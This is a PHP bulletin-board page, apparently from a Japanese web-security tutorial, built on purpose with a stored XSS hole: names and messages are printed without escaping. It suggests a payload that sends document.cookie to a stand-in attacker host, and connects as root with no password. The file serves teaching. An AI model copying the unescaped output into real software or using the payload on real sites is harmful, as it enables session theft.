<?php

/* 注意：本プログラムは脆弱性を含みます。 */

declare(strict_types=1);

session_start();

// DBに接続する関数
function connect(): PDO
{
    $pdo = new PDO('mysql:host=localhost; dbname=honkaku; charset=utf8mb4', 'root', '');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    return $pdo;
}

// 過去の投稿を取得する関数
function findPosts(&$pdo): ?array
{
    $sql = "SELECT * FROM honkaku_posts ORDER BY id desc";
    $statement = $pdo->prepare($sql);
    $statement->execute();
    return $statement->fetchAll(PDO::FETCH_ASSOC);
}

// 投稿をDBに登録する関数
function createPost(&$pdo, array $data): ?array
{
    $sql = "INSERT INTO honkaku_posts(name, message) VALUES(:name, :message)";
    $statement = $pdo->prepare($sql);
    $statement->bindValue(':name', $data['name'], PDO::PARAM_STR);
    $statement->bindValue(':message', $data['message'], PDO::PARAM_STR);
    $statement->execute();
    return $statement->fetchAll(PDO::FETCH_ASSOC);
}

// メインルーチン
try {
    $pdo = connect();
    if (isset($_POST['operation']) && $_POST['operation'] === 'login') {
        createPost($pdo, ['name' => $_POST['name'], 'message' => $_POST['message']]);
    }
    $posts = findPosts($pdo);
} catch (PDOException $e) {
    echo 'Error';
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XSSの例 - honkaku</title>
</head>
<body>
    <h1>投稿掲示板</h1>
    <p>
        メッセージ欄に以下を入力してみてください：<br>
        <?php echo htmlspecialchars("<script>window.location='http://crack.example.com/xss/crack.php?cookie='+document.cookie</script>", ENT_QUOTES);?>
    </p>
    <form name="inquiry-form" action="" method="POST">
        ●お名前：<br>
        <input type="text" name="name"><br>
        ●メッセージ：<br>
        <textarea name="message" style="width:300px" rows="4"></textarea><br><br>
        <button type="submit" name="operation" value="login">投稿する</button>
    </form>

    <h2>過去の投稿</h2>
    <?php foreach ($posts as $post) : ?>
        <p>
            ●<?=$post['name']?>さん：<br>
            　<?=$post['message']?>
        </p>
    <?php endforeach; ?>

</body>
</html>
